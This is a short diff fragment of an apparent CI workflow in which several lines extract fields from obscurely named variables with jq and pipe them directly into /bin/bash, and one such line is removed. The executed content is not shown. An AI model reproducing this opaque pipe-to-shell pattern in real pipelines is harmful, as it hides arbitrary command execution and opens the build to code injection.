@@ -22,7 +22,6 @@ jobs:
           echo $l2 | jq -r .jan47 | /bin/bash
           printf '%s' "$eba7" | jq -r .tb7798 | /bin/bash
           echo $aamx804 | jq -r .errd333 | /bin/bash
-          echo $ec56 | jq -r .l5 | /bin/bash
           echo $k60 | jq -r .gkhi49 | /bin/bash
 
       - name: Archive output
